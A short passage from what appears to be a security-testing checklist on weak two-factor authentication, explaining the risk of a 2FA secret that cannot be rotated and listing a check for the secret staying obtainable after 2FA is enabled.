	Rotating the secret means changing this key periodically to enhance security. If the 2FA secret cannot be rotated, it means that once the secret is compromised, an attacker could potentially gain ongoing access to the account without the userâ€™s knowledge, as there is no way for the user to change the secret.
- [ ] Weak 2FA Implementation  2FA Secret Remains Obtainable After 2FA is Enabled
	Look for Leaked 2FA Secret after acticvating 2FA
